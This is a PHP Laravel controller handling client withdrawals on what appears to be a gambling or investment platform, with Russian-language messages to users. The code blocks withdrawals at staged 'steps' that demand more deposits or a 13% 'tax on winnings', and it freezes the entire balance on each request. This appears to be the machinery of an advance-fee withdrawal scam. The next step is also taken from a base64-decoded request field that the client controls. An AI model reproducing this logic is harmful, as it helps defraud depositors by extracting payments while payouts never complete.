<?php

namespace App\Http\Controllers\Client;

use App\Models\Withdraw;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;

class WithdrawController extends Controller
{

    public function index()
    {
        $client = auth('client')->user();

        $withdraws = Withdraw::orderBy('created_at', 'desc')->where('client_id', auth('client')->user()->id);

        $pager = $withdraws->paginate();

        if ($client->step == 'pre_swift_second'  && $client->temp_balance < 200) {
            session()->flash('danger', 'Уважаемый клиент, для вывода средств сумма пополнений игрового баланса должна составлять не менее ' . setting('second_minimal_deposit', 200) . ' USD');
        }

        if ($client->step == 'tax_second' && $client->temp_balance < 265) {
            session()->flash('danger', 'Уважаемый клиент, для вывода средств необходимо оплатить налог на выигрыш.<br>
                    <b>Налог составляет 13% от суммы вывода.</b>');
            return redirect()->route('client.deposit.index');
        }

        return view('client.withdraw.index', ['pager' => $pager, 'client' => $client]);
    }

    public function create(Request $request)
    {
        $client = auth('client')->user();

        $withdraw_amount = $client->balance;

        if ($withdraw_amount < 10) {
            session()->flash('danger', 'Сумма должна быть больше 10 долларов.');

            return redirect()->route('client.withdraw.index');
        }

        if ($client->balance < $withdraw_amount) {
            session()->flash('danger', 'У вас недостаточно средств на балансе!');

            return redirect()->route('client.withdraw.index');
        }

        $this->validate($request, [
            'payout_address' => 'required',
            'payout_address_type' => 'required',
        ]);

        /**
         *  WTF???
         * Unreachable code. Maybe its a bug?
         * */
        if($client->bonus_balance){
            $withdraw = new Withdraw();
            $withdraw->partner_id = $client->partner_id;
            if ($client->partner) {
                $withdraw->partner_email = $client->partner->email;
            }
            $withdraw->client_id = $client->id;
            $withdraw->messages = 'Бонус 100% за пополнение';
            $withdraw->client_email = $client->email;
            $withdraw->payout_address_type = $request->get('payout_address_type');
            $withdraw->payout_address = str_replace('+', '',$request->get('payout_address'));
            $withdraw->payout_amount = $withdraw_amount*2;
            $withdraw->status = 'completed';
        }
        /**
         * END WTF???
         *
         */
        $withdraw = new Withdraw();
        $withdraw->partner_id = $client->partner_id;
        if ($client->partner) {
            $withdraw->partner_email = $client->partner->email;
        }
        $withdraw->client_id = $client->id;
        $withdraw->client_email = $client->email;
        $withdraw->payout_address_type = $request->get('payout_address_type');
        $withdraw->payout_address = str_replace('+', '',$request->get('payout_address'));
        $withdraw->payout_amount = $withdraw_amount;
        $withdraw->status = 'in_progress';
        $withdraw->save();

        $client->step = base64_decode($request->get('type'));

//        if ($client->is_swift_waited) {
//            $client->is_tax_waited = true;
//            $client->is_swift_waited = false;
//        } else {
//            $client->is_tax_waited = false;
//            $client->is_swift_waited = true;
//        }

        $client->freezed_amount += $withdraw_amount;
        $client->balance -= $withdraw_amount;
        $client->save();

        session()->flash('success', 'Заявка на вывод средств успешно создана. Она будет обработана в ближайшее время.');

        return redirect()->route('client.withdraw.index');
    }

}
